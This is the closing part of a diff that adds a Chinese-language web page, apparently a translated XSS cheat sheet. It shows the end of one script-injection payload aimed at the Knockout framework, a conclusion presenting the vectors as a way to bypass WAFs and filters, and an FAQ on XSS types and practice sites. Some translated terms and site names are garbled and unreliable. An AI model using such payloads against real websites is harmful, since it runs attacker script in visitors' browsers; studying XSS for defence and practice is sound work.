+&lt;/script&gt;&lt;script&gt;
+
+ko.applyBindings({})
+
+&lt;/script&gt;</code></pre>
+<h2 id="conclusion"><strong>结论</strong></h2>
+<p>在这个XSS备忘单中，我们讨论了与XSS(跨站点脚本)相关的各种命令，您可以在需要时立即查阅。XSS允许恶意脚本进入网站，以执行一些操作。每当您需要XSS命令时，这个跨站点脚本备忘单可以作为您的快速参考。</p>
+<p>有兴趣了解更多关于注射和网络攻击的知识吗？<a href="https://hackr.io/blog/sql-injection-cheat-sheet">查看我们的SQL注入备忘单</a>。</p>
+<h2 id="frequently-asked-questions"><strong>常见问题解答</strong></h2>
+<h4 id="toc-1-what-is-an-xss-cheat-sheet"><strong> 1。什么是XSS小抄？</strong></h4>
+<p>XSS备忘单由各种XSS向量组成，帮助你绕过WAFs和过滤器。</p>
+<h4 id="toc-2-what-is-an-xss-attack-with-example"><strong> 2。什么是XSS攻击(举例)？</strong></h4>
+<p>XSS或跨站脚本攻击是指黑客在受害者的浏览器中运行恶意的JavaScript代码。XSS攻击的一个典型例子是黑客在网站搜索表单发送的数据中存储恶意脚本。</p>
+<h4 id="toc-3-what-are-the-three-types-of-xss"><strong> 3。XSS的三种类型是什么？</strong></h4>
+<p>三种类型的XSS攻击是:</p>
+<ul>
+<li>反映了XSS</li>
+<li>商店XSS</li>
+<li>基于DOM的XSS</li>
+</ul>
+<h4 id="toc-4-where-can-i-practice-xss"><strong> 4。我能在哪里练习XSS？</strong></h4>
+<p>有太多易受攻击的网站可供你练习XSS。这些易受攻击的网站如下:</p>
+<ul>
+<li>谷歌XSS游戏</li>
+<li>警惕(1)赢</li>
+<li>提示(1)获胜</li>
+<li>山形21的XSS挑战</li>
+<li>kopernik的xss挑战</li>
+<li>XSS多语言挑战</li>
+<li>Acunetix的Vulnweb</li>
+<li>OWASP WebGoat项目</li>
+</ul>
+<h4 id="toc-5-does-html-encoding-prevent-xss"><strong> 5。HTML编码能防止XSS吗？</strong></h4>
+<p>不，HTML编码不能阻止XSS或覆盖所有类型的XSS攻击。</p>
+<h4 id="toc-6-which-is-the-most-common-type-of-xss-attack"><strong> 6。哪种类型的XSS攻击最常见？</strong></h4>
+<p>最常见的XSS攻击类型是反射攻击或非持续性攻击。</p>
+
+									</div>
+
+									</div>    
+</body>
+</html>
